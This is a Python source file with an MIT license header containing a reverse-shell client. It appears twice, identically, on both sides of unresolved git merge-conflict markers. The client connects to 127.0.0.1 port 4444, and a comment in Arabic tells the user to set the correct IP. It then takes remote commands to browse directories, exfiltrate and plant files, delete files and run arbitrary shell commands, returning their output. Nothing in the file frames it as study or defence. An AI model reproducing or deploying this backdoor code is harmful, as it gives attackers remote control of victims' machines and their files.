<<<<<<< HEAD
"""
MIT License

© 2024 [Mahmoud Al-Sharif]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket
import subprocess
import os

def send_file(client_socket, filepath):
    if os.path.exists(filepath):
        client_socket.send(filepath.encode())
        with open(filepath, 'rb') as f:
            data = f.read(1024)
            while data:
                client_socket.send(data)
                data = f.read(1024)
    else:
        client_socket.send(b'File not found')

def receive_file(client_socket, filepath):
    with open(filepath, 'wb') as f:
        while True:
            data = client_socket.recv(1024)
            if data == b'DONE':
                break
            f.write(data)

# إعداد العميل
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 4444))  # تأكد من أن هذا هو عنوان IP الصحيح

while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    elif command.lower().startswith('cd'):
        _, path = command.split(' ', 1)
        try:
            os.chdir(path)
            client_socket.send(b'Changed directory to ' + path.encode())
        except Exception as e:
            client_socket.send(str(e).encode())
    elif command.lower() == 'dir':
        try:
            files = os.listdir('.')
            client_socket.send('\n'.join(files).encode())
        except Exception as e:
            client_socket.send(str(e).encode())
    elif command.lower().startswith('get'):
        _, filepath = command.split(' ', 1)
        send_file(client_socket, filepath)
    elif command.lower().startswith('put'):
        _, filepath = command.split(' ', 1)
        receive_file(client_socket, filepath)
    elif command.lower().startswith('remove'):
        _, filepath = command.split(' ', 1)
        try:
            os.remove(filepath)
            client_socket.send(b'File removed')
        except Exception as e:
            client_socket.send(str(e).encode())
    else:
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

client_socket.close()
=======
"""
MIT License

© 2024 [Mahmoud Al-Sharif]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket
import subprocess
import os

def send_file(client_socket, filepath):
    if os.path.exists(filepath):
        client_socket.send(filepath.encode())
        with open(filepath, 'rb') as f:
            data = f.read(1024)
            while data:
                client_socket.send(data)
                data = f.read(1024)
    else:
        client_socket.send(b'File not found')

def receive_file(client_socket, filepath):
    with open(filepath, 'wb') as f:
        while True:
            data = client_socket.recv(1024)
            if data == b'DONE':
                break
            f.write(data)

# إعداد العميل
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 4444))  # تأكد من أن هذا هو عنوان IP الصحيح

while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    elif command.lower().startswith('cd'):
        _, path = command.split(' ', 1)
        try:
            os.chdir(path)
            client_socket.send(b'Changed directory to ' + path.encode())
        except Exception as e:
            client_socket.send(str(e).encode())
    elif command.lower() == 'dir':
        try:
            files = os.listdir('.')
            client_socket.send('\n'.join(files).encode())
        except Exception as e:
            client_socket.send(str(e).encode())
    elif command.lower().startswith('get'):
        _, filepath = command.split(' ', 1)
        send_file(client_socket, filepath)
    elif command.lower().startswith('put'):
        _, filepath = command.split(' ', 1)
        receive_file(client_socket, filepath)
    elif command.lower().startswith('remove'):
        _, filepath = command.split(' ', 1)
        try:
            os.remove(filepath)
            client_socket.send(b'File removed')
        except Exception as e:
            client_socket.send(str(e).encode())
    else:
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

client_socket.close()
>>>>>>> origin/main
